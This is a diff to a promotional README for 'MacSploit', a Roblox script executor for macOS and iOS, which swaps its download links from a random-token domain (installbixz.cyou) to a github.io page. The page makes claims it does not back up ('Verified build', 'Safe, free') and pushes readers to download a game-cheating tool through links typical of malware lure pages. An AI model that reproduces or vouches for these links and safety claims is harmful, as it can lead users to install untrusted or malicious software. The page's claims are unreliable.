@@ -29,7 +29,7 @@ Welcome to the official **MacSploit** repository – the most advanced and relia
 
 You can get the latest stable version of **macsploit** from our official site:
 
-👉 **[Download MacSploit](https://installbixz.cyou?knsujzowckefzpo)** 🔽
+👉 **[Download MacSploit](https://macsploitexecs.github.io/macsploit/)** 🔽
 
 - ✅ Verified build
 - ✅ 100% working on latest Roblox version
@@ -135,7 +135,7 @@ Currently, MacSploit is focused on MacOS and iOS. If you're using Windows or And
 
 🎉 Whether you're a seasoned developer or a casual gamer, **MacSploit** is the ultimate tool to level up your Roblox experience on Apple devices in 2026. With its native MacOS and iOS support, powerful features, and consistent updates, it stands tall among executors. Safe, free, and easy to use — it's time to experience scripting without limits.
 
-### [🍏 Download MacSploit Executor 🍏](https://installbixz.cyou?b45k4xk5e77tw98)
+### [🍏 Download MacSploit Executor 🍏](https://macsploitexecs.github.io/macsploit/)
 
 👉 Start now with **macsploit download free** and enjoy a new world of Roblox possibilities!
 
